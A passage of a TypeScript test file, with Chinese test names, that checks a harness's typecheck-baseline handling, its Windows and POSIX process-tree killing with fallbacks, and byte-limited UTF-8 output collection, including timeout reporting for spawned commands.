  test("输出截断（截断点之后还有错误）→ 基线不建立，部分输出不得入基线", async () => {
    const proj = mkProj("b-trunc")
    const tc = path.join(dir, "b-trunc.mjs")
    writeFileSync(
      tc,
      "console.log('x'.repeat(300_000))\n" +
        "console.error('src/y.ts:1:1 - error TS2: error after truncation point')\n",
    )
    const h = new Harness({
      dataDir: path.join(dir, "state-b-trunc"),
      safePrefixes,
      typecheckCmd: [process.execPath, tc],
      lintCmd: null,
      commandTimeoutMs: 30_000,
    })
    const b = await h.initialize(proj)
    expect(b.typecheckBaselineOk).toBe(false)
    expect(b.typecheckSigs).toEqual([])
    await h.dispose()
  }, 30_000)

  test("可执行文件无法启动（code null）→ 基线不建立，stderr 不被解析为签名", async () => {
    const proj = mkProj("b-spawn")
    const h = new Harness({
      dataDir: path.join(dir, "state-b-spawn"),
      safePrefixes: ["definitely-missing-exe"],
      typecheckCmd: ["definitely-missing-exe", "arg"],
      lintCmd: null,
    })
    const b = await h.initialize(proj)
    expect(b.typecheckBaselineOk).toBe(false)
    expect(b.typecheckSigs).toEqual([])
    await h.dispose()
  })
})

// ---------------------------------------------------------------------------
// 15. killProcessTree：taskkill error/status/signal 检查 + child.kill 回退 + 结果如实反映
// ---------------------------------------------------------------------------

describe.skipIf(process.platform !== "win32")("killProcessTree（Windows taskkill 分支）", () => {
  const fakeChild = (opts: { pid?: number; killOk?: boolean } = {}) => {
    const killed: string[] = []
    const child = {
      pid: opts.pid ?? 1234,
      exitCode: null,
      signalCode: null,
      kill: (sig?: string) => {
        killed.push(String(sig ?? "SIGTERM"))
        return opts.killOk ?? true
      },
    }
    return { child: child as unknown as ChildProcess, killed }
  }

  test("taskkill 成功（status 0 / 无 error / 无 signal）→ ok 且不调用 child.kill", () => {
    const { child, killed } = fakeChild()
    const impl = (() => ({ status: 0, signal: null, error: undefined })) as unknown as typeof spawnSync
    const r = killProcessTree(child, impl)
    expect(r.ok).toBe(true)
    expect(r.method).toBe("taskkill")
    expect(r.taskkillError).toBeUndefined()
    expect(killed).toEqual([])
  })

  test("taskkill 非零退出 → 回退 child.kill，taskkillError 记录退出码", () => {
    const { child, killed } = fakeChild()
    const impl = (() => ({ status: 1, signal: null, error: undefined })) as unknown as typeof spawnSync
    const r = killProcessTree(child, impl)
    expect(r.method).toBe("child-kill")
    expect(r.taskkillError).toContain("1")
    expect(killed).toEqual(["SIGKILL"])
    expect(r.ok).toBe(true) // 回退成功
  })

  test("taskkill 抛异常且 child.kill 失败 → ok=false，fallbackError 记录", () => {
    const { child, killed } = fakeChild({ killOk: false })
    const impl = (() => {
      throw new Error("spawn taskkill ENOENT")
    }) as unknown as typeof spawnSync
    const r = killProcessTree(child, impl)
    expect(r.method).toBe("child-kill")
    expect(r.taskkillError).toContain("ENOENT")
    expect(r.ok).toBe(false)
    expect(r.fallbackError).toContain("child.kill 失败")
    expect(killed).toEqual(["SIGKILL"])
  })

  test("taskkill 被信号终止 → 回退 child.kill 且 taskkillError 记录信号", () => {
    const { child } = fakeChild()
    const impl = (() => ({ status: null, signal: "SIGKILL", error: undefined })) as unknown as typeof spawnSync
    const r = killProcessTree(child, impl)
    expect(r.method).toBe("child-kill")
    expect(r.taskkillError).toContain("SIGKILL")
    expect(r.ok).toBe(true)
  })
})

describe("killProcessTree（通用）", () => {
  test("无 pid → 直接 child.kill", () => {
    const killed: string[] = []
    const child = {
      pid: undefined,
      exitCode: null,
      signalCode: null,
      kill: (sig?: string) => {
        killed.push(String(sig ?? "SIGTERM"))
        return true
      },
    }
    const r = killProcessTree(child as unknown as ChildProcess)
    expect(r.method).toBe("child-kill")
    expect(r.ok).toBe(true)
    expect(killed).toEqual(["SIGKILL"])
  })

  test.skipIf(process.platform === "win32")("POSIX：进程组 kill 失败 → 回退 child.kill", () => {
    const killed: string[] = []
    const child = {
      pid: 1234,
      exitCode: null,
      signalCode: null,
      kill: (sig?: string) => {
        killed.push(String(sig ?? "SIGTERM"))
        return true
      },
    }
    // 进程组 -1234 不存在 → process.kill 抛 ESRCH → 回退
    const r = killProcessTree(child as unknown as ChildProcess)
    expect(r.method).toBe("child-kill")
    expect(r.ok).toBe(true)
    expect(killed).toEqual(["SIGKILL"])
  })
})

// ---------------------------------------------------------------------------
// 16. OutputCollector：Buffer 字节累计 + StringDecoder 整体解码（跨 chunk UTF-8 正确）
// ---------------------------------------------------------------------------

describe("OutputCollector", () => {
  test("按字节计数：超过 maxBytes 的数据被丢弃并置 truncated", () => {
    const c = new OutputCollector(5)
    c.push(Buffer.from("abc"))
    expect(c.truncated).toBe(false)
    c.push(Buffer.from("de"))
    expect(c.byteLength).toBe(5)
    expect(c.truncated).toBe(false)
    c.push(Buffer.from("f")) // 已满 → 丢弃
    expect(c.truncated).toBe(true)
    expect(c.toString()).toBe("abcde")
  })

  test("字符串输入按 utf8 字节累计（多字节字符占 2 字节）", () => {
    const c = new OutputCollector(10)
    c.push("héllo") // h(1) é(2) l l o(1) = 6 字节
    expect(c.byteLength).toBe(6)
    expect(c.toString()).toBe("héllo")
  })

  test("跨 chunk 的多字节 UTF-8 序列被正确拼接解码", () => {
    const c = new OutputCollector(100)
    const 中 = Buffer.from("中") // e4 b8 ad
    c.push(中.subarray(0, 1))
    c.push(中.subarray(1, 2))
    c.push(中.subarray(2))
    expect(c.toString()).toBe("中")
    expect(c.byteLength).toBe(3)
  })

  test("逐字节推送大量 UTF-8：无 U+FFFD 损坏字符且长度受字节上限约束", () => {
    const c = new OutputCollector(300)
    const payload = Buffer.from("中".repeat(200)) // 600 字节
    for (let i = 0; i < payload.length; i++) c.push(payload.subarray(i, i + 1))
    const s = c.toString()
    expect(c.truncated).toBe(true)
    expect(s).not.toContain("\uFFFD")
    expect(Buffer.byteLength(s)).toBeLessThanOrEqual(300)
    expect(s).toContain("中")
  })

  test("截断点落在多字节字符中间：丢弃不完整尾字节，无 U+FFFD", () => {
    const c = new OutputCollector(2)
    c.push(Buffer.from("中")) // e4 b8 ad = 3 字节，只保留前 2 字节
    const s = c.toString()
    expect(c.truncated).toBe(true)
    expect(s).not.toContain("\uFFFD")
    expect(s).toBe("")
  })
})

// ---------------------------------------------------------------------------
// 17. runCommand：跨 chunk UTF-8 输出无损坏（集成）
// ---------------------------------------------------------------------------

describe("runCommand UTF-8", () => {
  let dir = ""
  beforeAll(async () => {
    dir = await mkdtemp(path.join(os.tmpdir(), "lidar-utf8-"))
  })
  afterAll(async () => {
    await rm(dir, { recursive: true, force: true })
  })

  test("跨 chunk 多字节输出被正确解码（无替换字符）", async () => {
    const script = path.join(dir, "utf8-split.mjs")
    // 每次写 7 字节：与 3 字节/字符的中文字符错开，强制 chunk 边界切在多字节序列中间
    writeFileSync(
      script,
      `const payload = Buffer.from("中".repeat(30_000))\n` +
        `for (let i = 0; i < payload.length; i += 7) process.stdout.write(payload.subarray(i, i + 7))\n`,
    )
    const r = await runCommand(dir, [process.execPath, script], 30_000)
    expect(r.ok).toBe(true)
    expect(r.stdout).toContain("中")
    expect(r.stdout).not.toContain("\uFFFD")
  })

  test("超时强杀失败路径：结果如实携带 kill 详情（killFailed）", async () => {
    // 用非法的 taskkill 无法验证；此处验证超时后结果携带 kill 字段且与 timedOut 一致
    const hang = path.join(dir, "hang2.mjs")
    writeFileSync(hang, "setInterval(() => {}, 1000)\n")
    const r = await runCommand(dir, [process.execPath, hang], 400)
    expect(r.timedOut).toBe(true)
    expect(r.ok).toBe(false)
    expect(r.kill).toBeDefined()
    // Windows 上 taskkill 通常成功 → killFailed=false；若失败也必须如实标记（ok 与 killFailed 互斥一致）
    expect(r.killFailed).toBe(r.kill !== undefined && !r.kill!.ok)
  }, 20_000)
})
